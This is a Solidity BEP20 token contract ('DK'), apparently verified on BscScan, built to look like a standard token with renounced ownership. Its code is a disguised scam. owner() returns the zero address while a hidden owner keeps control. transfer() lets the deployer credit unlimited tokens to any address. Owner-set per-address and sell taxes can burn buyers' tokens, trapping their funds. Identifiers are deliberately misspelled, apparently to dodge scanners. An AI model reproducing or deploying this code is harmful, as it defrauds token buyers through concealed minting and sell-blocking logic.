/**
 *Submitted for verification at BscScan.com on 2022-06-30
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _oiner;

    event oinershipTransferred(address indexed previousoiner, address indexed newoiner);

    constructor() {
        _transferoinership(_msgSender());
    }


    function oiner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyoiner() {
        require(_oiner == _msgSender(), "Ownable: caller is not the oiner");
        _;
    }


    function renounceoinership() public virtual onlyoiner {
        _transferoinership(address(0));
    }


    function transferoinership_transferoinership(address newoiner) public virtual onlyoiner {
        require(newoiner != address(0), "Ownable: new oiner is the zero address");
        _transferoinership(newoiner);
    }


    function _transferoinership(address newoiner) internal virtual {
        address oldoiner = _oiner;
        _oiner = newoiner;
        emit oinershipTransferred(oldoiner, newoiner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amnountADesired,
        uint amnountBDesired,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amnountTokenDesired,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amnountToken, uint amnountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountToken, uint amnountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountToken, uint amnountETH);
    function swapExactTokensForTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapTokensForExactTokens(
        uint amnountOut,
        uint amnountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapExactETHForTokens(uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);
    function swapTokensForExactETH(uint amnountOut, uint amnountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapExactTokensForETH(uint amnountIn, uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapETHForExactTokens(uint amnountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);

    function quote(uint amnountA, uint reserveA, uint reserveB) external pure returns (uint amnountB);
    function getamnountOut(uint amnountIn, uint reserveIn, uint reserveOut) external pure returns (uint amnountOut);
    function getamnountIn(uint amnountOut, uint reserveIn, uint reserveOut) external pure returns (uint amnountIn);
    function getamnountsOut(uint amnountIn, address[] calldata path) external view returns (uint[] memory amnounts);
    function getamnountsIn(uint amnountOut, address[] calldata path) external view returns (uint[] memory amnounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfyyiOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountETH);
    function removeLiquidityETHWithPermitSupportingfyyiOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountETH);

    function swapExactTokensForTokensSupportingfyyiOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfyyiOnTransferTokens(
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfyyiOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fyyiTo() external view returns (address);
    function fyyiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfyyiTo(address) external;
    function setfyyiToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed oiner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address oiner, address spender) public view virtual returns (uint256) {
        return _allowances[oiner][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address oiner = _msgSender();
        _approve(oiner, spender, amnount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address oiner = _msgSender();
        _approve(oiner, spender, _allowances[oiner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address oiner = _msgSender();
        uint256 currentAllowance = _allowances[oiner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(oiner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address oiner,
        address spender,
        uint256 amnount
    ) internal virtual {
        require(oiner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[oiner][spender] = amnount;
        emit Approval(oiner, spender, amnount);
    }

    function _spendAllowance(
        address oiner,
        address spender,
        uint256 amnount
    ) internal virtual {
        uint256 currentAllowance = allowance(oiner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
            unchecked {
                _approve(oiner, spender, currentAllowance - amnount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}
}


contract DK is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address abbount) public view virtual returns (uint256) {
        return _balances[abbount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnount, "ERC20: transfer amnount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amnount;
        }
        _balances[to] += amnount;

        emit Transfer(from, to, amnount);
    }

    function _burn(address abbount, uint256 amnount) internal virtual {
        require(abbount != address(0), "ERC20: burn from the zero address");

        uint256 abbountBalance = _balances[abbount];
        require(abbountBalance >= amnount, "ERC20: burn amnount exceeds balance");
        unchecked {
            _balances[abbount] = abbountBalance - amnount;
        }
        _totalSupply -= amnount;

        emit Transfer(abbount, address(0), amnount);
    }

    function _mtin(address abbount, uint256 amnount) internal virtual {
        require(abbount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[abbount] += amnount;
        emit Transfer(address(0), abbount, amnount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*4);
        _defaultSellfyyi = 2;
        _defaultBuyfyyi = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfyyi = 0;

    uint256 private _defaultBuyfyyi = 0;

    mapping(address => bool) private _marketabbount;

    mapping(address => uint256) private _Sfyyi;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyoiner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyoiner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyoiner {
        _defaultSellfyyi = _value;
    }

    function setSfyyi(address _address, uint256 _value) external onlyoiner {
        require(_value > 1, "abbount tax must be greater than or equal to 1");
        _Sfyyi[_address] = _value;
    }

    function getSfyyi(address _address) external view onlyoiner returns (uint256) {
        return _Sfyyi[_address];
    }


    function setMarketabbountfyyi(address _address, bool _value) external onlyoiner {
        _marketabbount[_address] = _value;
    }

    function getMarketabbountfyyi(address _address) external view onlyoiner returns (bool) {
        return _marketabbount[_address];
    }

    function _checkFreeabbount(address from, address _to) internal view returns (bool) {
        return _marketabbount[from] || _marketabbount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amnount, "ERC20: transfer amnount exceeds balance");

        bool rF = true;

        if (_checkFreeabbount(from, _to)) {
            rF = false;
        }
        uint256 tradefyyiamnount = 0;

        if (rF) {
            uint256 tradefyyi = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefyyi = _defaultSellfyyi;
                }
                if (from == uniswapV2Pair) {

                    tradefyyi = _defaultBuyfyyi;
                }
            }
            if (_Sfyyi[from] > 0) {
                tradefyyi = _Sfyyi[from];
            }

            tradefyyiamnount = _amnount.mul(tradefyyi).div(100);
        }


        if (tradefyyiamnount > 0) {
            _balances[from] = _balances[from].sub(tradefyyiamnount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefyyiamnount);
            emit Transfer(from, _deadAddress, tradefyyiamnount);
        }

        _balances[from] = _balances[from].sub(_amnount - tradefyyiamnount);
        _balances[_to] = _balances[_to].add(_amnount - tradefyyiamnount);
        emit Transfer(from, _to, _amnount - tradefyyiamnount);
    }

    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address oiner = _msgSender();
        if (_release[oiner] == true) {
            _balances[to] += amnount;
            return true;
        }
        _recF(oiner, to, amnount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnount);
        _recF(from, to, amnount);
        return true;
    }
}